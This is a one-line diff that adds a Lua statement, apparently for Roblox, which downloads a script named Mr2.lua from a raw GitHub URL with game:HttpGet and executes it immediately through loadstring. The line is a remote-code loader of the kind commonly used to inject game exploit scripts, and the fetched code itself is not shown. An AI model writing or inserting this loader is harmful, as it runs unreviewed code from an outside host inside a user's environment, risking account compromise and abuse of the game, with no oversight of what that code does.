@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/hodrich/pool/main/Mr2.lua'))()
